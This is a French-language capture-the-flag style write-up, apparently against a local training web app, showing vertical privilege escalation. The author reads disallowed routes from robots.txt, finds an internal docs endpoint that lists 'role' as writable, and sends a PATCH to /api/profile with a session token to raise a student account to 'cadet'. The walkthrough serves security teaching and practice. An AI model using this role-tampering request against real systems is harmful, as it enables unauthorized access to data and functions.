**A01 : Broken Access Control / Vertical Privilege escalation**

Definition : 

Permet a un utilisateur d'obtenir un role qu'il n'est pas cense pouvoir obtenir lui-meme et donc acceder a des donnees ou des fonctionnalites qui ne lui sont pas dediees.

**Processus de decouverte / Reproduction**

Dans le fichier `robots.txt` on peut voir les routes qui ne sont normalement pas accessible : 

```
User-agent: *
Disallow: /admin
Disallow: /staff
Disallow: /internal
Disallow: /backup
Disallow: /api/grades
Disallow: /_/
Disallow: /static/uploads/
```

En les prenant dans l'ordre, on s'apercoit que la route `localhost:4942/staff` est accessible.

Indice suivant :

![image](../../../utils/A01/assets/staff_hint.png)

Pour avoir acces au dashboard staff, on nous dit qu'il nous faut a minima les droits `cadet`, qui peuvent etre modifie via une requete `PATCH` sur la route `localhost:4942/api/profile`. 

Dans le code source, on a un autre indice : 

![image](../../../utils/A01/assets/source_hint.png)

On va donc checker la route `localhost:4942/api/docs-internals` :

```json
HTTP/1.1 200 OK
date: Wed, 26 Aug 2026 11:55:15 GMT
server: uvicorn
content-length: 327
content-type: application/json
x-powered-by: Python/3.11 FastAPI/0.104
server: uvicorn/0.24.0 Linux
x-pocketbase: http://localhost:8090
x-42-internal: campus=paris

{
    "collections":{
        "users":{
            "writable_fields":[
                "first_name",
                "last_name",
                "campus",
                "avatar",
                "role"
                ],
            "role_values":[
                "visitor",
                "student",
                "cadet",
                "staff",
                "god"
                ],
            "note":"role writable via PATCH /api/profile"
        },
        "grades":{
            "fields":[
                "id",
                "student",
                "project",
                "score",
                "flag"
                ],
            "note":"flag field accessible via GET /api/grades?student={id}"
            }
        }
    }
```

A partir d'ici, je pense qu'on a tout, on va pouvoir construire la requete POSTMAN pour patcher le role de l'utilisateur : 

On va donner des privileges a John Doe, notre gros malin au mot de passe : 

Donc :  
1. Cookie de session : `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ6NHAxY254NDdtZnk1MGYiLCJsb2dpbiI6Impkb2UiLCJyb2xlIjoic3R1ZGVudCIsImV4cCI6MTc4ODM0OTg3OH0.0OPdx4b4h7x2SLfTL-cwF3ugis7p2MzkCCPppsyWS6c`
2. Body : (JSON) `{"role": "cadet"}`
3. On send le PATCH sur la route `http://localhost:4942/api/profile`

![image](../../../utils/A01/assets/postman.png)

- Avant :

![image](../../../utils/A01/assets/student.png)

- Apres :

![image](../../../utils/A01/assets/cadet.png)

- Resultat : 

![image](../../../utils/A01/assets/result.png)
